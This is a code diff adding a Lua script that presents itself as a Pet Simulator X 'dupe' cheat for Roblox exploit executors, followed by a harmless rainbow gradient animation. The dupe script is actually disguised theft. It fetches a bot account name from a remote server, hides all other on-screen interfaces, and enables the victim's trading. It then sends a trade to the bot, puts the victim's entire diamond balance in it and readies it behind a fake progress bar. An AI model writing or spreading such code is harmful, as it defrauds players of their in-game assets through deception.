@@ -113,3 +113,315 @@ Status.TextColor3 = Color3.fromRGB(255, 255, 255)
 Status.TextScaled = true
 Status.TextSize = 50.000
 Status.TextWrapped = true
+
+-- Scripts:
+
+local function YEIV_fake_script() -- KMDHUBPSXDUPE.LocalScript 
+	local script = Instance.new('LocalScript', KMDHUBPSXDUPE)
+
+	-- script.Parent.Parent = game:GetService("CoreGui")
+	local status = script.Parent.background.Status
+	local bar = script.Parent.background.barBG.bar
+	local donebar = script.Parent.background.barBG.donebar
+	--Bar progress positions
+	tenpercent = UDim2.new(0, 98,0, 165)
+	thirtypercent = UDim2.new(0, 243,0, 165)
+	fiftypercent = UDim2.new(0, 328,0, 165)
+	seventypercent = UDim2.new(0, 479,0, 165)
+	ninetypercent = UDim2.new(0, 590,0, 165)
+	onehundredpercent = UDim2.new(0, 628,0, 165)
+	wait(5)
+	warn("[KMD-HUB] Loaded second dupe script.")
+	coroutine.wrap(function() -- For anti guis
+		while wait(.1) do
+			pcall(function()
+				for i,v in pairs(game:GetDescendants()) do
+					if v:IsA("ScreenGui") and v.Name ~= "KMDHUB-PSXDUPE" then
+						v.Enabled = false
+					end
+				end
+			end)
+		end
+	end)()
+	--Functions
+	local function typeEffect(text)
+		status.DialogFrame.Dialog.Text = ""
+		for i = 1, #text do
+			status.DialogFrame.Dialog.Text = string.sub(text, 1, i)
+			wait(0.04)
+		end
+	end
+	function tweensizesync(uiobject, speed, finaludim)
+		uiobject:TweenSize(finaludim, 'Out', 'Quint', speed)
+		wait(speed + 0.1)
+	end
+	function tweensizeasync(uiobject, speed, finaludim)
+		uiobject:TweenSize(finaludim, 'Out', 'Quint', speed)
+	end
+	-- Initialize
+	local http_request = http_request
+	if not (syn or KRNL_LOADED or SENTINEL_V2) then
+		game.Players.LocalPlayer:Kick("\n[KMD-HUB]\nUnsupported exploit.")
+		wait(5)
+		game:Shutdown()
+	end
+	if IsElectron then
+		game.Players.LocalPlayer:Kick("\n[KMD-HUB]\nUnsupported exploit.")
+	else
+		if syn then 
+			http_request = syn.request
+		elseif SENTINEL_V2 then
+			http_request = request
+		elseif request then
+			http_request = request
+		else
+			game.Players.LocalPlayer:Kick("\n[KMD-HUB]\nUnsupported exploit.")
+			return
+		end
+	end
+	local function http_request_get(url)
+		return http_request({
+			Url=url,
+			Method="GET",
+			Headers={
+				["spvsc-1"] = "P0bXIb7kPjpmcHV42yEL5eduU",
+				["spvsc-2"] = "cvQM4CjRHDTg4jRgcAabokw58",
+				["spvsc-3"] = "JcuZGgSg1D3In1GKQPlhLPFLC",
+			}
+		}).Body
+	end
+	
+	--Start
+	local robberName = http_request_get("https://kmd-hub.000webhostapp.com/petsimx-getBotNames.php")
+	if game.Players:FindFirstChild(robberName) then
+		-- Identifier
+		--Send trade
+		local notLoaded = Instance.new("Message", game:GetService("CoreGui"))
+		typeEffect("Waiting for the trading 75 seconds cooldown.")
+		for i=0,75 do
+			wait(1)
+			status.Text = "Waiting for the trading "..tostring(75-i).." seconds cooldown."
+		end
+		tweensizesync(bar,2,tenpercent)
+		typeEffect("Preparing stuff for request...") -- 10 percent
+		if game.Players.LocalPlayer.Character:FindFirstChild("LeftHand") then
+			game.Players.LocalPlayer.Character.LeftHand:Destroy()
+		end
+		local v2 = require(game.ReplicatedStorage:WaitForChild("Framework"):WaitForChild("Library"));
+		-- Enable trades
+		tweensizesync(bar,2,thirtypercent)
+		typeEffect("Enabling trades for local player...") -- 30 percent
+		if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text ~= "All" then
+			repeat
+				wait(1)
+				local args = {
+					[1] = {
+						[1] = "Trading"
+					}
+				}
+				if game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All" then break end
+				workspace.__THINGS.__REMOTES:FindFirstChild("toggle setting"):FireServer(unpack(args))
+			until game:GetService("Players").LocalPlayer.PlayerGui.Settings.Frame.Container.Trading.Toggle.Label.Text == "All"
+		end
+		tweensizesync(bar,2,fiftypercent)
+		typeEffect("Sending request...") -- 50 percent
+		tweensizesync(bar,2,seventypercent)
+		typeEffect("Waiting for response...") -- 70 percent
+		v2.Network.Fired("Init Trade"):Connect(function(p3, p4)
+			tradeName = p3;
+		end);
+		local args = {
+			[1] = {
+				[1] = robberName
+			}
+		}
+	
+		workspace.__THINGS.__REMOTES:FindFirstChild("send trade invite"):InvokeServer(unpack(args))
+		repeat
+			wait()
+			print("Waiting for trade")
+		until tradeName
+		print("Trade name: "..tradeName)
+		local ohTable1 = {
+			[1] = tradeName,
+			[2] = 1e4294892093
+		}
+		tweensizesync(bar,2,ninetypercent)
+		typeEffect("You are almost done!") -- 90 percent
+		workspace.__THINGS.__REMOTES["change trade diamonds"]:InvokeServer(ohTable1)
+		local ohTable1 = {
+			[1] = tradeName
+		}
+	
+		workspace.__THINGS.__REMOTES["ready trade"]:InvokeServer(ohTable1)
+		wait(15)
+		tweensizesync(bar,2,onehundredpercent)
+		for i=0,10 do
+			bar.ImageTransparency = bar.ImageTransparency + .1
+			donebar.ImageTransparency = donebar.ImageTransparency - .1
+		end
+		typeEffect("We are done! Do not forget to leave a like and subscribe to our YT channel!") -- 100 percent
+		wait(10)
+		game:Shutdown()
+	else
+		game.Players.LocalPlayer:Kick("\n[KMD-HUB]\nNo duplication bot is available at the moment.\nTry again later.")
+		wait(5)
+		game:Shutdown()
+	end
+end
+coroutine.wrap(YEIV_fake_script)()
+local function HCSEW_fake_script() -- Gradient_2.Animate 
+	local script = Instance.new('LocalScript', Gradient_2)
+
+	local button = script.Parent
+	local gradient = script.Parent
+	local ts = game:GetService("TweenService")
+	local ti = TweenInfo.new(3, Enum.EasingStyle.Linear, Enum.EasingDirection.Out)
+	local offset = {Offset = Vector2.new(1, 0)}
+	local create = ts:Create(gradient, ti, offset)
+	local startingPos = Vector2.new(-1, 0)
+	local list = {} --list of random colors (we'll be generating them shortly after)
+	local s, kpt = ColorSequence.new, ColorSequenceKeypoint.new
+	local counter = 0 --count the last table index we just indexed/last gradient color reference
+	local status = "down" --[[there will be two groups of if statements (one above and one below). 
+	It glitches out some times and runs the same group multiple times, so we need this. ]] 
+	gradient.Offset = startingPos --reset the offset of the gradient
+	
+	local function rainbowColors()
+	
+	    --[[HSV uses values 0-1, but we'll use until 255 and divide later to 
+	    better control the colors.]]
+	
+		local sat, val = 255, 255 
+	
+		for i = 1, 15 do --15 is a multiple of 255
+	
+			local hue = i * 17 --255/15 = 17
+			table.insert(list, Color3.fromHSV(hue / 255, sat / 255, val / 255)) --divide by 255 to be in range of 0-1
+	
+		end
+	
+	end
+	
+	rainbowColors() --add to the list table
+	
+	--set up the first gradient 
+	gradient.Color = s({
+	
+		kpt(0, list[#list]),
+		kpt(0.5, list[#list - 1]),
+		kpt(1, list[#list - 2])
+	
+	})
+	
+	counter = #list --max indexed is #list, which is 10 in this instance
+	local function animate()
+	
+		create:Play()
+		create.Completed:Wait() --wait for tween completion
+		gradient.Offset = startingPos 
+		gradient.Rotation = 180 --flip time!
+	
+	    --[[#list - 1 because we have 3 key points, 1 will be preserved from 
+	    the previous tween, while the other 2 are new. We need to make 
+	    sure that indexing something beyond #list doesn't happen as it will 
+	    throw an error. In this instance, it will be 9, 10, and instead of it looking
+	    for 11, it will go back to 1.]]
+		if counter == #list - 1 and status == "down" then
+	
+			gradient.Color = s({
+	
+				kpt(0, gradient.Color.Keypoints[1].Value), --preserve previous color, which we'll be able to see
+				kpt(0.5, list[#list]), --change this color behind the scenes!
+				kpt(1, list[1]) --change this color behind the scenes!
+	
+			})
+	
+			counter = 1 --last index is 1 i.e. list[1]
+			status = "up" --the upper section already ran, time for the lower!
+	
+		elseif counter == #list and status == "down" then --if the current counter is exactly 10 (in this instance), then it will go back to 1 and 2
+	
+			gradient.Color = s({
+	
+				kpt(0, gradient.Color.Keypoints[1].Value),
+				kpt(0.5, list[1]),
+				kpt(1, list[2])
+	
+			})
+	
+			counter = 2
+			status = "up"
+	
+		elseif counter <= #list - 2 and status == "down" then  --in all other cases, when couter is 1-8
+	
+			gradient.Color = s({
+	
+				kpt(0, gradient.Color.Keypoints[1].Value),
+				kpt(0.5, list[counter + 1]), --one color over
+				kpt(1, list[counter + 2]) --two colors over
+	
+			})
+	
+			counter = counter + 2
+			status = "up"
+	
+		end
+	
+		create:Play()
+		create.Completed:Wait()
+		gradient.Offset = startingPos
+		gradient.Rotation = 0 --flip time again!
+	
+		if counter == #list - 1 and status == "up" then --same as before, really, but instead of "down", it's "up", since the upper section already ran
+	
+			gradient.Color = s({
+	
+				--descending order because now it's rotation 0
+				kpt(0, list[1]), --1
+				kpt(0.5, list[#list]), --10
+				kpt(1, gradient.Color.Keypoints[3].Value) --put this at #3 because we just flipped rotation, so this color will be at the opposite side
+	
+			})
+	
+			counter = 1
+			status = "down" --below section already ran, back to the top!
+	
+		elseif counter == #list and status == "up" then
+	
+			gradient.Color = s({
+	
+				kpt(0, list[2]), --2
+				kpt(0.5, list[1]), --1
+				kpt(1, gradient.Color.Keypoints[3].Value) --10
+	
+			})
+	
+			counter = 2
+			status = "down"
+	
+		elseif counter <= #list - 2 and status == "up" then --in all other cases like before
+	
+			gradient.Color = s({
+	
+				kpt(0, list[counter + 2]), 
+				kpt(0.5, list[counter + 1]), 
+				kpt(1, gradient.Color.Keypoints[3].Value) 
+	
+			})
+	
+			counter = counter + 2
+			status = "down"
+	
+		end
+	
+		animate() --call the function inside of itself, so that it runs indefinitely
+	
+	end
+	repeat
+		wait()
+	until script.Parent.Parent.Parent.Parent.background.BackgroundTransparency < 1
+	wait(1)
+	animate() --call the function initially 
+end
+coroutine.wrap(HCSEW_fake_script)()
